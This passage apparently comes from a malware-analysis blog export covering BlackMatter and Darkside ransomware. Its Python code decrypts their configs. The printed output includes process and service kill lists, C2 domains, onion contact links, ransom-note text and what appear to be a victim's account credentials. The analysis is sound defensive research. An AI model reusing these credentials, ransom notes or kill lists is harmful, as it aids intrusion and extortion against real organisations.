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 x00&#39; . import base64 ptr = 0 rsa_data = ptxt_data[ptr:128] ptr += 128 affiliate_id_data = ptxt_data[ptr:ptr+32] ptr+= 32 config_flags = ptxt_data[ptr:ptr+22] ptr+= 8 config_values_offset = struct.unpack(&#39;&lt;I&#39;,ptxt_data[ptr:ptr+4])[0] config_values_buffer = ptxt_data[ptr+config_values_offset:] config_values = [] for c in config_values_buffer.split(b&#39; x00&#39;): config_values.append(base64.b64decode(c)) . def is_ascii(s): return all(c &lt; 128 for c in s) print(&quot;RSA: %r n&quot; % rsa_data) print(&quot;Affiliate ID: %r n&quot; % affiliate_id_data) print(&quot;Flags: %s n&quot; % tohex(config_flags)) for c in config_values: if not is_ascii(c): c = new_data = decrypt(c,len(c), seed) print(&quot;%s n&quot; % b&#39; | &#39;.join([s.replace(b&#39; x00&#39;,b&#39;&#39;) for s in c.split(b&#39; x00 x00&#39;)])) . RSA: b&#39; x87 x19 xa80 xf4 xba x94 x94 x92 x91X+fT xf9l x96 xd9 xa0 xf4A x9fR xf3g xcf. x19 xb9 xc9Z x9bp x91 xcb xef xaf xbeZ xe3 x9d xae(X x94Y n x8d xb8 xb7d xe5r xfa xb5#FF xf8e x9a xda/ xbd x8c7 xbf xdd xd6 x07 x97 xa5 xad x9d xad- xed7 x96 x9d x17 x9e xa4 xadL x19 x80 xd0 xe7 x0b x05bA xd3% xe1 x8b xeb xc4 x92_ xa5j xbf x81 x0f x91ny2 xd0 x16 xa8n: xd9wI xe7_ x901 x11K x06 x0bV&#39; Affiliate ID: b&#39;Q$x xc0 x8d xad xa2 xaf x19 xe4 x98 x08 xfb xda[ x0b xa6 xf30 xb0 x9c xd4{O xb9!Ox6 xaaF xad&#39; Flags: b&#39;000101010101010124000000a1000000e20000000000&#39; b&#39; xc4 xe2 x95wo xed9&gt; x10 xdb x16 xd9. xa5 x01 xcc xaeP xc4t xdc xb0 xbc xf5 xe2 x860 xde x9e x1b x81Q x91 x0e xc9 x7f xe4Y xe6 x8aX*~ x0e x84W xb0 xed x1aA xe9f x10 x0fq xbd x1eg x02z xa7 xac[ xa9z x9el x1b xe1 x1f xb8 xb1, xbepPX: xcc xb1L xc0 xc0 x13 x943 x99 x05 x97 x14CT&#39; b&#39;8 xceF[ x0f xbe x93 xd3 x12 xfc xe9$ xdf xdf; x96R x86 xbf x9a x01q x10 x82E x02 xb7 xd0 xb9 xea xe3 xf2 xd8 xb5 xa9 xaa xc9 xda x1d.E&gt;&lt;S; xf2 x0e&#39; b&#34; xf9 xa9 x82v x1a x0f xc7 x8aT2 x9c x9bIh xbb xb7 x03j x96 xac x01 x16^ xe47 xfb( xbc x10M x11 x8e$n x19 x9e x1f x7f x88 x1d xca x0f x14^ x93&#39;r xd3)j xe3j xebqK xda nZ1 xe3sV xe6^z xbd n x1b xdd n xf0w%#YH xcc xc5 xba x01 x14 xb5 xce$ xa1Q xe9 xd1 x17 xbf xdd x9d xe2 x11 xc0 x9aL!~ xf0a x83 xa9:m x04 xd3O n xd6_t xd04 xe0 xe4 x83 xd6 xc2 xb9 tB&amp; x18^ xa3Y xd0 xf3 xe6{S xa3 x9d xcby xef xc8z xf7/ xd4./ x07N xa3 x86% xba xe5X xb8W xa4Ry xe3 rZ x1c xf4 xbd xd1 xc4{o xe9 xea1 xc9 xb2P x030 x92 xab9 xe6js; xb2 xce x87 xcf xdfw xba xf6^ x88 xdc xb7 xf7 xa8N xa23 x83v xe9 x8e xb2&#34; b&#39;encsvc | thebat | mydesktopqos | xfssvccon | firefox | infopath | winword | steam | synctime | notepad | ocomm | onenote | mspub | thunderbird | agntsvc | sql | excel | powerpnt | outlook | wordpad | dbeng50 | isqlplussvc | sqbcoreservice | oracle | ocautoupds | dbsnmp | msaccess | tbirdconfig | ocssd | mydesktopservice | visio | | &#39; b&#39;mepocs | memtas | veeam | svc$ | backup | sql | vss | | &#39; b&#39;https://paymenthacks.com | http://paymenthacks.com | https://mojobiden.com | http://mojobiden.com | | &#39; b&#39;aheisler@hhcp.com:120Heisler | dsmith@hhcp.com:Tesla2019 | administrator@hhcp.com:iteam8** | | &#39; b&#34; ~+ r n * + r n &#39; BLACK | r n () .-.,=&#39;``&#39;=. - o - r n &#39;=/_ | r n * | &#39;=._ | r n `=./`, &#39; r n . &#39;=.__.=&#39; `=&#39; * r n + Matter + r n O * &#39; . r n r n&gt;&gt;&gt; What happens? r n Your network is encrypted, and currently not operational. We have downloaded 1TB from your fileserver. r n We need only money, after payment we will give you a decryptor for the entire network and you will restore all the data. r n r n&gt;&gt;&gt; What guarantees? r n We are not a politically motivated group and we do not need anything other than your money. r n If you pay, we will provide you the programs for decryption and we will delete your data. r n If we do not give you decrypters or we do not delete your data, no one will pay us in the future, this does not comply with our goals. r n We always keep our promises. r n r n&gt;&gt; Data leak includes r n1. Full emloyeers personal data r n2. Network information r n3. Schemes of buildings, active project information, architect details and contracts, r n4. Finance info r n r n r n&gt;&gt;&gt; How to contact with us? r n 1. Download and install TOR Browser (https://www.torproject.org/). r n 2. Open http://supp24yy6a66hwszu2piygicgwzdtbwftb76htfj7vnip3getgqnzxid.onion/7NT6LXKC1XQHW5039BLOV. r n r n&gt;&gt;&gt; Warning! Recovery recommendations. r n We strongly recommend you to do not MODIFY or REPAIR your files, that will damage them.&#34; b&#39;&#39; .",
            "url": "https://research.openanalysis.net/blackmatter/ransomware/malware/config/2021/10/28/blackmatter_ransomware.html",
            "relUrl": "/blackmatter/ransomware/malware/config/2021/10/28/blackmatter_ransomware.html",
            "date": " ‚Ä¢ Oct 28, 2021"
        }
        
    
  
    
        ,"post73": {
            "title": "Darkside Ransomware",
            "content": "Overview . Sample: 0A0C225F0E5EE941A79F2B7701F1285E4975A2859EB4D025D96D9E366E81ABB9 . References: . Malshare Sample | ChuongDong Blog | Cybergeeks Blog | . Helper Functions . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . API Hashing . A simple API hashing algorithm is used to resolve LoadLibraryA and GetProcAddress. . The rest of the dynamically resolved APIs are resolved via GetProcAddress once their function names have been decrypted. . kernel32_hash = 999818334 string = b&#39;k x00e x00r x00n x00e x00l x003 x002 x00. x00d x00l x00l x00&#39; hash_high = 0xffff hash_low = 0xffff for ptr in range(len(string)): hash_low = (hash_low + string[ptr]) hash_high = (hash_high + hash_low) hash_high %= 0xFFF1 hash_low %= 0xFFF1 hash = (hash_high &lt;&lt; 16) + hash_low print(hex(hash)) print(&#39;===&#39;) print(hex(kernel32_hash)) . 0x3b98045e === 0x3b98045e . API String Decryption . A unique decryption method is used to both decrypt the API strings as well as other data stored in the ransomware binary. The decryption is split into two main functions, one used to generate a decryption key buffer, and another used to perform the actual decryption. . import struct def gen_key_buffer(buf1, buf2): key_buffer = [0]*256 v3 = 240 v4 = buf1[:4] v5 = buf1[4:8] v6 = buf1[8:12] result = buf1[12:] v3 = 240 while v3 &gt;= 0: for i in range(4): key_buffer[v3 + i + 12 ] = v4[i] key_buffer[v3 + i + 8 ] = result[i] key_buffer[v3 + i + 4 ] = v5[i] key_buffer[v3 + i] = v6[i] v4 = struct.pack(&#39;&lt;I&#39;, (struct.unpack(&#39;&lt;I&#39;,v4)[0] - 0x10101010) &amp; 0xffffffff); result = struct.pack(&#39;&lt;I&#39;, (struct.unpack(&#39;&lt;I&#39;,result)[0] - 0x10101010) &amp; 0xffffffff); v5 = struct.pack(&#39;&lt;I&#39;, (struct.unpack(&#39;&lt;I&#39;,v5)[0] - 0x10101010) &amp; 0xffffffff); v6 = struct.pack(&#39;&lt;I&#39;, (struct.unpack(&#39;&lt;I&#39;,v6)[0] - 0x10101010) &amp; 0xffffffff); v3 -= 16 lo_v8 = 0 v9 = 0 v10 = 0 flag_return = False while True: if flag_return: break while True: lo_result = key_buffer[v9] &amp; 0xff lo_v8 = (lo_result + ((buf2[v10] + lo_v8) &amp; 0xff)) &amp; 0xff hi_result = key_buffer[lo_v8] v10 += 1 key_buffer[lo_v8] = lo_result key_buffer[v9] = hi_result if v10 &gt;= 16: break v9 += 1 v9 &amp;= 0xff if v9 == 0: flag_return = True break v10 = 0 v9 += 1 v9 &amp;= 0xff if v9 == 0: break return key_buffer def decrypt_data(data, key_buffer): data = list(data) data_len = len(data) key = key_buffer.copy() edx = 0 cl = 0 curr_index = 0 eax = 0 while data_len != 0: cl = (key[(1 + edx) &amp; 0xff] + cl) &amp; 0xFF eax = key[(1 + edx) &amp; 0xff] &amp; 0xFF ch = key[cl] &amp; 0xFF key[cl] = eax key[(1 + edx) &amp; 0xff] = ch eax = (ch + eax) &amp; 0xFF edx = (edx + 1) &amp; 0xff data[curr_index] ^= key[eax] curr_index += 1 data_len -= 1 return bytes(data) . Setup Decryption Key Buffer . KEY_BUFFER can be used in the decryption algorithms as a global . KEY_BUFFER = gen_key_buffer(unhex(&#39;edf9e5ed8640fd53ab185838646bd9df&#39;),unhex(&#39;92b2801a9c19867db6a5002936c1084a&#39;)) decrypt_data(unhex(&#39;7b0d2ddb284b&#39;),KEY_BUFFER) . b&#39;ntdll x00&#39; . Config Decryption Functions . Because the config file is so large it needs it&#39;s own custom decryption wrapper to decrypt 256 bytes at a time. The decryption routine also needs to handle 256 blocks of data. The config is also compressed using aplib and the values are base64 encoded. . The following functions will aid in the config decryption. . Large Data Decrypt . def decrypt_large_data(data, key_buffer): out = b&#39;&#39; for ptr in range(0,len(data),255): out += decrypt_data(data[ptr:ptr+255],key_buffer) return out . APLib . Credit: Sandor Nemes (snemes) . import struct from binascii import crc32 from io import BytesIO __all__ = [&#39;APLib&#39;, &#39;decompress&#39;] __version__ = &#39;0.6&#39; __author__ = &#39;Sandor Nemes&#39; class APLib(object): __slots__ = &#39;source&#39;, &#39;destination&#39;, &#39;tag&#39;, &#39;bitcount&#39;, &#39;strict&#39; def __init__(self, source, strict=True): self.source = BytesIO(source) self.destination = bytearray() self.tag = 0 self.bitcount = 0 self.strict = bool(strict) def getbit(self): # check if tag is empty self.bitcount -= 1 if self.bitcount &lt; 0: # load next tag self.tag = ord(self.source.read(1)) self.bitcount = 7 # shift bit out of tag bit = self.tag &gt;&gt; 7 &amp; 1 self.tag &lt;&lt;= 1 return bit def getgamma(self): result = 1 # input gamma2-encoded bits while True: result = (result &lt;&lt; 1) + self.getbit() if not self.getbit(): break return result def depack(self): r0 = -1 lwm = 0 done = False try: # first byte verbatim self.destination += self.source.read(1) # main decompression loop while not done: if self.getbit(): if self.getbit(): if self.getbit(): offs = 0 for _ in range(4): offs = (offs &lt;&lt; 1) + self.getbit() if offs: self.destination.append(self.destination[-offs]) else: self.destination.append(0) lwm = 0 else: offs = ord(self.source.read(1)) length = 2 + (offs &amp; 1) offs &gt;&gt;= 1 if offs: for _ in range(length): self.destination.append(self.destination[-offs]) else: done = True r0 = offs lwm = 1 else: offs = self.getgamma() if lwm == 0 and offs == 2: offs = r0 length = self.getgamma() for _ in range(length): self.destination.append(self.destination[-offs]) else: if lwm == 0: offs -= 3 else: offs -= 2 offs &lt;&lt;= 8 offs += ord(self.source.read(1)) length = self.getgamma() if offs &gt;= 32000: length += 1 if offs &gt;= 1280: length += 1 if offs &lt; 128: length += 2 for _ in range(length): self.destination.append(self.destination[-offs]) r0 = offs lwm = 1 else: self.destination += self.source.read(1) lwm = 0 except (TypeError, IndexError): if self.strict: raise RuntimeError(&#39;aPLib decompression error&#39;) return bytes(self.destination) def pack(self): raise NotImplementedError def aplib_decompress(data, strict=False): packed_size = None packed_crc = None orig_size = None orig_crc = None if data.startswith(b&#39;AP32&#39;) and len(data) &gt;= 24: # data has an aPLib header header_size, packed_size, packed_crc, orig_size, orig_crc = struct.unpack_from(&#39;=IIIII&#39;, data, 4) data = data[header_size : header_size + packed_size] if strict: if packed_size is not None and packed_size != len(data): raise RuntimeError(&#39;Packed data size is incorrect&#39;) if packed_crc is not None and packed_crc != crc32(data): raise RuntimeError(&#39;Packed data checksum is incorrect&#39;) result = APLib(data, strict=strict).depack() if strict: if orig_size is not None and orig_size != len(result): raise RuntimeError(&#39;Unpacked data size is incorrect&#39;) if orig_crc is not None and orig_crc != crc32(result): raise RuntimeError(&#39;Unpacked data checksum is incorrect&#39;) return result . Config Decryption . The config is stored in the data or ndata section of the PE file. The first two 16-byte blocks are the components of the key buffer. Following the key material is a DWORD that indicates the size of the encrypted config. This is followed by the encrypted config itself. . The actual config decryption process is as follows. . Find the data section | Locate the size of the config at offset 0x20 | Extract the encrypted config | Decrypt config using the custom decryption algorithm | Decompress the resulting data using aplib | . import pefile import struct RANSOMWARE_FILE = r&#39;/tmp/darkside.bin&#39; data = open(RANSOMWARE_FILE, &#39;rb&#39;).read() pe = pefile.PE(data=data) # Get section with config section_data = None for s in pe.sections: if b&#39;ndata&#39; in s.Name: section_data = s.get_data() break # Extract config config_length = struct.unpack(&#39;&lt;I&#39;,section_data[0x20:0x24])[0] enc_data = section_data[0x24:0x24+config_length] # Decrypt config ap_data = decrypt_large_data(enc_data, KEY_BUFFER) # Decompress config data with aplib ptxt_data = aplib_decompress(ap_data) ptxt_data . b&#34; x01 x00 x01 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xef&amp;u&gt; x87 x15 xd8( xb1 xf3A xef xb1 xc9 xd3 xdbw xd2 x08 xad x1c/ xaa xd0, xf4 xc7 xbc&lt;s x89k xd9 x88!s xe31 xbe xd4 xcb}W x9d; xf5 xacnt xe5O x07gBe xed xc5 xc8 x1f xe5 x90 x8e xa4 xdeb * xe9 xac x90 x8d x03 xb3 x13 xc1 x9d* xb2 xb1]W x19 x08W x0fa x0e L xd8 xe2 xd2 t x11 x14Oo xf2 xd8a xca xc4 xa1 x81` xdb x15 x916 n xf5W xbc xc2 xe8 xb9D x13_j}Q xda x802 x90:u0607b8382472634 x00 xd0 x90 xe4 x95o xe6,&#39; x19VG x14wXCy x02 x01 x00 x01 x01 x01 x01 x01 x00 x01 x01 x01 x01 x01 x01 x01 x01 x01 x01 x01 x02 x010 x00 x00 x00 xdd x02 x00 x00. x04 x00 x00 xb7 x06 x00 x00 xd0 x06 x00 x00 xf1 x06 x00 x00 xb6 x07 x00 x00 x8b n x00 x00d x0b x00 x00 x00 x00 x00 x00 xb5 x0b x00 x00 xbe x0c x00 x00JAByAGUAYwB5AGMAbABlAC4AYgBpAG4AAABjAG8AbgBmAGkAZwAuAG0AcwBpAAAAJAB3AGkAbgBkAG8AdwBzAC4AfgBiAHQAAAAkAHcAaQBuAGQAbwB3AHMALgB+AHcAcwAAAHcAaQBuAGQAbwB3AHMAAABhAHAAcABkAGEAdABhAAAAYQBwAHAAbABpAGMAYQB0AGkAbwBuACAAZABhAHQAYQAAAGIAbwBvAHQAAABnAG8AbwBnAGwAZQAAAG0AbwB6AGkAbABsAGEAAABwAHIAbwBnAHIAYQBtACAAZgBpAGwAZQBzAAAAcAByAG8AZwByAGEAbQAgAGYAaQBsAGUAcwAgACgAeAA4ADYAKQAAAHAAcgBvAGcAcgBhAG0AZABhAHQAYQAAAHMAeQBzAHQAZQBtACAAdgBvAGwAdQBtAGUAIABpAG4AZgBvAHIAbQBhAHQAaQBvAG4AAAB0AG8AcgAgAGIAcgBvAHcAcwBlAHIAAAB3AGkAbgBkAG8AdwBzAC4AbwBsAGQAAABpAG4AdABlAGwAAABtAHMAbwBjAGEAYwBoAGUAAABwAGUAcgBmAGwAbwBnAHMAAAB4ADYANABkAGIAZwAAAHAAdQBiAGwAaQBjAAAAYQBsAGwAIAB1AHMAZQByAHMAAABkAGUAZgBhAHUAbAB0AAAAAAB= x00YQB1AHQAbwByAHUAbgAuAGkAbgBmAAAAYgBvAG8AdAAuAGkAbgBpAAAAYgBvAG8AdABmAG8AbgB0AC4AYgBpAG4AAABiAG8AbwB0AHMAZQBjAHQALgBiAGEAawAAAGQAZQBzAGsAdABvAHAALgBpAG4AaQAAAGkAYwBvAG4AYwBhAGMAaABlAC4AZABiAAAAbgB0AGwAZAByAAAAbgB0AHUAcwBlAHIALgBkAGEAdAAAAG4AdAB1AHMAZQByAC4AZABhAHQALgBsAG8AZwAAAG4AdAB1AHMAZQByAC4AaQBuAGkAAAB0AGgAdQBtAGIAcwAuAGQAYgAAAAAA x00MwA4ADYAAABhAGQAdgAAAGEAbgBpAAAAYgBhAHQAAABiAGkAbgAAAGMAYQBiAAAAYwBtAGQAAABjAG8AbQAAAGMAcABsAAAAYwB1AHIAAABkAGUAcwBrAHQAaABlAG0AZQBwAGEAYwBrAAAAZABpAGEAZwBjAGEAYgAAAGQAaQBhAGcAYwBmAGcAAABkAGkAYQBnAHAAawBnAAAAZABsAGwAAABkAHIAdgAAAGUAeABlAAAAaABsAHAAAABpAGMAbAAAAGkAYwBuAHMAAABpAGMAbwAAAGkAYwBzAAAAaQBkAHgAAABsAGQAZgAAAGwAbgBrAAAAbQBvAGQAAABtAHAAYQAAAG0AcwBjAAAAbQBzAHAAAABtAHMAcwB0AHkAbABlAHMAAABtAHMAdQAAAG4AbABzAAAAbgBvAG0AZQBkAGkAYQAAAG8AYwB4AAAAcAByAGYAAABwAHMAMQAAAHIAbwBtAAAAcgB0AHAAAABzAGMAcgAAAHMAaABzAAAAcwBwAGwAAABzAHkAcwAAAHQAaABlAG0AZQAAAHQAaABlAG0AZQBwAGEAYwBrAAAAdwBwAHgAAABsAG8AYwBrAAAAawBlAHkAAABoAHQAYQAAAG0AcwBpAAAAcABkAGIAAAAAAH== x00YgBhAGMAawB1AHAAAAAAAC== x00cwBxAGwAAABzAHEAbABpAHQAZQAAAAAA x00dgBtAGMAbwBtAHAAdQB0AGUALgBlAHgAZQAAAHYAbQBtAHMALgBlAHgAZQAAAHYAbQB3AHAALgBlAHgAZQAAAHMAdgBjAGgAbwBzAHQALgBlAHgAZQAAAFQAZQBhAG0AVgBpAGUAdwBlAHIALgBlAHgAZQAAAGUAeABwAGwAbwByAGUAcgAuAGUAeABlAAAAAAB= x00cwBxAGwAAABvAHIAYQBjAGwAZQAAAG8AYwBzAHMAZAAAAGQAYgBzAG4AbQBwAAAAcwB5AG4AYwB0AGkAbQBlAAAAYQBnAG4AdABzAHYAYwAAAGkAcwBxAGwAcABsAHUAcwBzAHYAYwAAAHgAZgBzAHMAdgBjAGMAbwBuAAAAbQB5AGQAZQBzAGsAdABvAHAAcwBlAHIAdgBpAGMAZQAAAG8AYwBhAHUAdABvAHUAcABkAHMAAABlAG4AYwBzAHYAYwAAAGYAaQByAGUAZgBvAHgAAAB0AGIAaQByAGQAYwBvAG4AZgBpAGcAAABtAHkAZABlAHMAawB0AG8AcABxAG8AcwAAAG8AYwBvAG0AbQAAAGQAYgBlAG4AZwA1ADAAAABzAHEAYgBjAG8AcgBlAHMAZQByAHYAaQBjAGUAAABlAHgAYwBlAGwAAABpAG4AZgBvAHAAYQB0AGgAAABtAHMAYQBjAGMAZQBzAHMAAABtAHMAcAB1AGIAAABvAG4AZQBuAG8AdABlAAAAbwB1AHQAbABvAG8AawAAAHAAbwB3AGUAcgBwAG4AdAAAAHMAdABlAGEAbQAAAHQAaABlAGIAYQB0AAAAdABoAHUAbgBkAGUAcgBiAGkAcgBkAAAAdgBpAHMAaQBvAAAAdwBpAG4AdwBvAHIAZAAAAHcAbwByAGQAcABhAGQAAABuAG8AdABlAHAAYQBkAAAAAAA= x00dgBzAHMAAABzAHEAbAAAAHMAdgBjACQAAABtAGUAbQB0AGEAcwAAAG0AZQBwAG8AYwBzAAAAcwBvAHAAaABvAHMAAAB2AGUAZQBhAG0AAABiAGEAYwBrAHUAcAAAAEcAeABWAHMAcwAAAEcAeABCAGwAcgAAAEcAeABGAFcARAAAAEcAeABDAFYARAAAAEcAeABDAEkATQBnAHIAAAAAAH== x00YgBhAHIAbwBxAHUAZQB0AGUAZQBzAC4AYwBvAG0AAAByAHUAbQBhAGgAcwBpAGEALgBjAG8AbQAAAAAA x00VwBlAGwAYwBvAG0AZQAgAHQAbwAgAEQAYQByAGsAUwBpAGQAZQAhACAADQAKACAAIAANAAoAIABBAGwAbAAgAFkAbwB1AHIAIABGAGkAbABlAHMAIABBAHIAZQAgAEUAbgBjAHIAeQBwAHQAZQBkACEAIAANAAoAIAAgAA0ACgAgAEYAaQBuAGQAIAAlAHMAIABBAG4AZAAgAEYAbwBsAGwAbwB3ACAASQBuAHMAdAByAHUAYwB0AGkAbwBuAHMAIQAAAAAA x00LS0tLS0tLS0tLS0gWyBXZWxjb21lIHRvIERhcmtTaWRlIF0gLS0tLS0tLS0tLS0tLT4gDQogIA0KIFdoYXQgaGFwcGVuZD8gDQogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSANCiBZb3VyIGNvbXB1dGVycyBhbmQgc2VydmVycyBhcmUgZW5jcnlwdGVkLCBiYWNrdXBzIGFyZSBkZWxldGVkLiBXZSB1c2Ugc3Ryb25nIGVuY3J5cHRpb24gYWxnb3JpdGhtcywgc28geW91IGNhbm5vdCBkZWNyeXB0IHlvdXIgZGF0YS4gDQogQnV0IHlvdSBjYW4gcmVzdG9yZSBldmVyeXRoaW5nIGJ5IHB1cmNoYXNpbmcgYSBzcGVjaWFsIHByb2dyYW0gZnJvbSB1cyAtIHVuaXZlcnNhbCBkZWNyeXB0b3IuIFRoaXMgcHJvZ3JhbSB3aWxsIHJlc3RvcmUgYWxsIHlvdXIgbmV0d29yay4gDQogRm9sbG93IG91ciBpbnN0cnVjdGlvbnMgYmVsb3cgYW5kIHlvdSB3aWxsIHJlY292ZXIgYWxsIHlvdXIgZGF0YS4gDQogIA0KIERhdGEgbGVhayANCiAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIA0KIEZpcnN0IG9mIGFsbCB3ZSBoYXZlIGRvd25sb2FkZWQgbW9yZSB0aGVuIDUwMEdCIGRhdGEgZnJvbSB5b3VyIG5ldHdvcmsuIA0KICANCiBJbmNsdWRlZDogDQogLUFjY291bnRpbmcgZGF0YSANCiAtRmluYW5jZSBkYXRhIA0KIC1IUiANCiAtRW1wbG95ZWVzIGNvbmZpZGVudGlhbCBkYXRhKHBob3RvcywgYmVuZWZpdHMsIHRheGVzLCBldGMpIA0KIC1NYXJrZXRpbmcgDQogLUJ1ZGdldHMgDQogLVRheGVzKHNhbGVzIHRheCBjb21wbGlhbmNlLCBwcm9wZXJ0eSwgaW5jb21lIGFuZCBmcmFuY2hpc2UgdGF4ZXMsIGV0YykgDQogLVBheXJvbGxzIA0KIC1CYW5raW5nIGRhdGEgDQogLUFyYml0cmF0aW9uIA0KIC1TY2FucyANCiAtSW5zdXJhbmNlIA0KIC1SZWNvbmNpbGlhdGlvbnMgDQogLVJlcG9ydHMobW9udGhseSBiYW5rIGludmVudG9yeSwgbW9udGhseSBmaW5hbmNpYWwsIGNsYWltcyByZXBvcnRzLCBldGMpIA0KIC1BdWRpdHMoREhHLCBpbnN1cmFuY2UgYXVkaXRzLCBldGMpIA0KIC1CMkIgY2xpZW50cyBjb25maWcgZGF0YSANCiAtQ29uZmlkZW50aWFsaXR5IDIwMjAgDQogLTIwMjAsIDIwMjEgQnVzaW5lc3MgcGxhbnMgDQogLTIwMTksIDIwMjAsIDIwMjEgeWVhcnMgQ2xvc2luZyAoZnVsbCBkdW1wcykgDQogLWFuZCBhIGxvdCBvZiBvdGhlciBzZW5zaXRpdmUgZGF0YSANCiAgDQogWW91ciBwZXJzb25hbCBsZWFrIHBhZ2U6IGh0dHA6Ly9kYXJrc2lkYzNpdXg0NjJuNnl1bmV2b2FnNTJudHZ3cDZ3dWxhejN6aXJrbWg0Y256NmhoajdpZC5vbmlvbi8xNjIvdGhlZGl4aWVncm91cC9MQ2Z5SFJjd2ZmcllUYmxwWnZvUE8zWERicllQY051MHdWQXNINXA0OUxTakJmelRtdGRYVDQ4YXpYRmxNdTdxIA0KIE9uIHRoZSBwYWdlIHlvdSB3aWxsIGZpbmQgZXhhbXBsZXMgb2YgZmlsZXMgdGhhdCBoYXZlIGJlZW4gZG93bmxvYWRlZC4gDQogVGhlIGRhdGEgaXM